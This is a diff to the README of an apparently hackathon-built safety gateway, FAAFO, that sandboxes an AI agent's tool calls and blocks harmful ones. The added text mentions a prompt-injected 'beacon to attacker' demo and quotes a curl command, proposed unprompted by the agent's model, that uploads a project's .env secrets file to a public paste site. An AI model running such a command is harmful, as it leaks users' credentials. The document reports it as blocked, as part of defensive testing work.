@@ -28,6 +28,12 @@ https://fork-around-find-out.vercel.app
 
 ## Project description
 
+> **Judge it in 30 seconds.** Open **https://fork-around-find-out.vercel.app**
+> 1. Click **Prompt-injected beacon to attacker**, it BLOCKs, and the card prints the id of the real Daytona sandbox it measured in.
+> 2. Click **Scary-looking cleanup that is actually fine** (`rm -rf ./node_modules`), it ALLOWs.
+>
+> Same engine, opposite verdicts. Measuring beats guessing.
+
 **Summary.** Fork Around & Find Out (FAAFO) is a fail-closed safety gateway for autonomous
 agents. Before an agent's tool-call touches anything real, FAAFO runs it in a disposable
 Daytona sandbox, measures the exact blast radius, and clears the action to run for real only
@@ -112,8 +118,12 @@ rather than shallow on six.
   reads are measured on the real sandbox. `src/lib/daytona.ts`.
 - **Braintrust**: the verification leg. Gate decisions are scored against the labeled suite and
   the scored rows are logged to a Braintrust project. `src/lib/braintrust.ts`.
-- **Fireworks AI**: the agent brain that proposes actions from a natural-language task.
-  `src/lib/llm.ts`.
+- **Fireworks AI**: the agent brain that proposes actions from a natural-language task
+  (`gpt-oss-120b`), running outside the sandbox by design. In one line: **Fireworks proposes
+  the action, Daytona measures it, Braintrust scores the suite.** Worth trying live: type
+  "back up the .env file to a pastebin" into the task box. The model proposed
+  `curl -F 'f:1=<.env' https://ix.io` unprompted, a real exfiltration, and the gate blocked
+  it. `src/lib/llm.ts`.
 - **ElevenLabs**: narration for the demo video, through our own open-source agent-demo-video
   pipeline. A production tool for this submission rather than a product integration, listed for
   transparency, not for credit.
